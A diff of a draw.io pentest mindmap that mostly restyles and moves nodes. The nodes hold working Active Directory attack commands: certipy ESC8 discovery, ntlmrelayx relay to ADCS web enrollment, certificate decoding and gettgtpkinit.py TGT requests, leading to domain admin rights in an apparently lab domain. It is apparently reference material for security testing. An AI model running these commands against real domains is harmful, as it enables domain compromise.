@@ -298,29 +298,29 @@
         <mxCell id="_LFIwpbgAgwoRebmZAz1-1" value="&lt;div&gt;Make a coerce to force DC to authenticate to me &lt;br&gt;(authenticated if patched)&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=1;shadow=0;align=center;verticalAlign=middle;spacing=6;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=1;fillColor=#12aab5;gradientColor=none;strokeColor=default;spacingBottom=22;" parent="1" vertex="1">
           <mxGeometry x="-100" y="805" width="220" height="100" as="geometry" />
         </mxCell>
-        <mxCell id="_LFIwpbgAgwoRebmZAz1-11" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;fillColor=#e51400;strokeColor=#B20000;strokeWidth=3;" parent="1" source="_LFIwpbgAgwoRebmZAz1-4" target="_LFIwpbgAgwoRebmZAz1-7" edge="1">
+        <mxCell id="_LFIwpbgAgwoRebmZAz1-11" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;fillColor=#e51400;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" parent="1" source="_LFIwpbgAgwoRebmZAz1-4" target="_LFIwpbgAgwoRebmZAz1-7" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="_LFIwpbgAgwoRebmZAz1-4" value="&lt;div&gt;&lt;b&gt;ADCS&lt;br&gt;&lt;/b&gt;&lt;/div&gt;&lt;div&gt;&lt;b&gt;ESC8&lt;/b&gt; : web enrollement is up ?&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;certipy find -u user@domain.local -p pass -dc-ip [ip] -vulnerable&lt;/font&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="1659" y="905" width="360" height="90" as="geometry" />
+          <mxGeometry x="1632" y="775" width="360" height="90" as="geometry" />
         </mxCell>
-        <mxCell id="_LFIwpbgAgwoRebmZAz1-12" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeWidth=3;fillColor=#e51400;strokeColor=#B20000;" parent="1" source="_LFIwpbgAgwoRebmZAz1-7" target="_LFIwpbgAgwoRebmZAz1-9" edge="1">
+        <mxCell id="_LFIwpbgAgwoRebmZAz1-12" style="edgeStyle=segmentEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeWidth=3;fillColor=#e51400;strokeColor=#2F5B7C;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" parent="1" source="_LFIwpbgAgwoRebmZAz1-7" target="_LFIwpbgAgwoRebmZAz1-9" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <object label="&lt;div&gt;relay to the web enrollement ADCS&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;ntlmrelay.py&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController" id="_LFIwpbgAgwoRebmZAz1-7">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" parent="1" vertex="1">
-            <mxGeometry x="2139" y="915" width="180" height="70" as="geometry" />
+            <mxGeometry x="2046" y="786" width="176" height="70" as="geometry" />
           </mxCell>
         </object>
-        <mxCell id="Kfw4rbIWasHMYPfyiLrn-2" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" parent="1" source="_LFIwpbgAgwoRebmZAz1-9" target="Kfw4rbIWasHMYPfyiLrn-1" edge="1">
+        <mxCell id="Kfw4rbIWasHMYPfyiLrn-2" value="" style="edgeStyle=segmentEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" parent="1" source="_LFIwpbgAgwoRebmZAz1-9" target="Kfw4rbIWasHMYPfyiLrn-1" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="LUB5KluwDhGO-CHIsPKq-4" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="_LFIwpbgAgwoRebmZAz1-9" target="LUB5KluwDhGO-CHIsPKq-3" edge="1">
+        <mxCell id="LUB5KluwDhGO-CHIsPKq-4" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" parent="1" source="_LFIwpbgAgwoRebmZAz1-9" target="LUB5KluwDhGO-CHIsPKq-3" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <object label="Get the certificate" convert_pfx_64_to_PFX="cat cert4.b64 | base64 -d &gt; crt.pfx" id="_LFIwpbgAgwoRebmZAz1-9">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" parent="1" vertex="1">
-            <mxGeometry x="2354" y="920" width="120" height="60" as="geometry" />
+            <mxGeometry x="2300" y="791" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
         <mxCell id="A1-m0vl6AtPKf8VYdlRc-2" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;fontSize=12;startSize=8;endSize=8;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-9" target="OzdCo0pd7L-W225KIUEy-3" edge="1">
@@ -337,23 +337,23 @@
             <mxGeometry x="1164" y="530" width="190" height="90" as="geometry" />
           </mxCell>
         </object>
-        <mxCell id="hefA_bYV9p1Cq4kSP_zY-19" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeWidth=3;strokeColor=#cc0000;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-10" target="hefA_bYV9p1Cq4kSP_zY-17" edge="1">
+        <mxCell id="hefA_bYV9p1Cq4kSP_zY-19" style="edgeStyle=segmentEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeWidth=3;strokeColor=#2F5B7C;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-10" target="hefA_bYV9p1Cq4kSP_zY-17" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="hefA_bYV9p1Cq4kSP_zY-10" value="&lt;div&gt;Relay to HTTP&lt;br&gt;&lt;/div&gt;&amp;nbsp;or HTTPS" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" parent="1" vertex="1">
-          <mxGeometry x="1169" y="925" width="130" height="60" as="geometry" />
+          <mxGeometry x="1169" y="790" width="130" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="vb0LG8Mru1kXp_7aFiLo-10" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#cc0000;strokeWidth=3;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-17" target="_LFIwpbgAgwoRebmZAz1-4" edge="1">
+        <mxCell id="vb0LG8Mru1kXp_7aFiLo-10" style="rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;edgeStyle=segmentEdgeStyle;endArrow=block;endFill=1;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-17" target="_LFIwpbgAgwoRebmZAz1-4" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="hefA_bYV9p1Cq4kSP_zY-17" value="&lt;div&gt;no Prerequisites for HTTP&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;EAP enabled for HTTPS&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=1;fontSize=14;" parent="1" vertex="1">
-          <mxGeometry x="1419" y="915" width="182" height="80" as="geometry" />
+          <mxGeometry x="1370" y="780" width="182" height="80" as="geometry" />
         </mxCell>
         <mxCell id="hefA_bYV9p1Cq4kSP_zY-24" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-21" target="hefA_bYV9p1Cq4kSP_zY-22" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="hefA_bYV9p1Cq4kSP_zY-21" value="&lt;div&gt;Relay to LDAP or LDAPs&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" parent="1" vertex="1">
-          <mxGeometry x="1169" y="1025" width="130" height="60" as="geometry" />
+          <mxGeometry x="1169" y="890" width="130" height="60" as="geometry" />
         </mxCell>
         <mxCell id="i_53WrwCQ5BU9_YikGZj-2" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-22" target="i_53WrwCQ5BU9_YikGZj-1" edge="1">
           <mxGeometry relative="1" as="geometry" />
@@ -365,7 +365,7 @@
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="hefA_bYV9p1Cq4kSP_zY-22" value="&lt;div&gt;Prerequisites :&lt;/div&gt;&lt;div&gt;-signing not required or EPA disabled for LDAPS&lt;br&gt;&lt;/div&gt;&lt;div&gt;- incoming NTLM auth over HTTP or&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;white-space: pre;&quot;&gt;&#x9;&lt;/span&gt;target vulnerable CVE 2019-1040 ; 2019-1166 ; ...&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=1;fontSize=14;align=left;" parent="1" vertex="1">
-          <mxGeometry x="1379" y="1010" width="362" height="90" as="geometry" />
+          <mxGeometry x="1392" y="874" width="362" height="90" as="geometry" />
         </mxCell>
         <mxCell id="B9babmQNDwbTDUQ_FJxj-2" value="" style="rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=11;fontColor=default;labelBackgroundColor=default;elbow=vertical;endArrow=block;endFill=1;" parent="1" source="D0Nr5EjnPLK_zhP2Ymg5-1" target="OdaqT3pz17vKf_LpFtww-5" edge="1">
           <mxGeometry relative="1" as="geometry">
@@ -410,7 +410,7 @@
         </mxCell>
         <object label="Pass the certificate" create_ticket="gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;" id="Kfw4rbIWasHMYPfyiLrn-1">
           <mxCell style="whiteSpace=wrap;html=1;rounded=1;fillColor=default;strokeColor=#d79b00;" parent="1" vertex="1">
-            <mxGeometry x="2674" y="920" width="120" height="60" as="geometry" />
+            <mxGeometry x="2514" y="791" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
         <mxCell id="RcJsrnn1SgcJtgKbqCFV-1" value="Domain Admin right" style="rounded=1;whiteSpace=wrap;html=1;fontSize=13;fillColor=#c64600;strokeColor=#B20000;fontColor=#ffffff;" parent="1" vertex="1">
@@ -446,7 +446,7 @@
         </mxCell>
         <object label="&lt;div&gt;get ASREP key via preauth kerberos&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;gettgtpkinit.py&lt;/font&gt;&lt;/div&gt;" cmd="gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;" id="LUB5KluwDhGO-CHIsPKq-3">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" parent="1" vertex="1">
-            <mxGeometry x="2514" y="1014" width="120" height="60" as="geometry" />
+            <mxGeometry x="2520" y="865" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
         <mxCell id="LUB5KluwDhGO-CHIsPKq-10" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" parent="1" source="LUB5KluwDhGO-CHIsPKq-7" target="LUB5KluwDhGO-CHIsPKq-9" edge="1">
